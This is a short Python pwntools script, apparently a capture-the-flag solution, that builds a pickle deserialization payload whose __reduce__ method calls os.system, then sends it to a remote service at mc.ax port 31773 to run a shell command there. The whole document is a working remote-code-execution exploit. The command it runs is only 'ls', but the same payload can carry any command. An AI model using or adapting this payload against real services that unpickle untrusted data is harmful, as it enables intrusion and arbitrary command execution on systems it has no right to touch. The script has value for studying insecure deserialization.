#!/usr/bin/python3
from pwn import *
import pickle
import os

context.log_level= 'debug'

class RCE:
    def __reduce__(self):
        cmd = ('ls')
        return os.system, (cmd,)

pickled = pickle.dumps(RCE(),0)
pickle.loads(str(pickled).encode())

conn = remote('mc.ax', 31773)
print(conn.recvuntil(b'pickle: '))
conn.send(pickled)
conn.recvall()
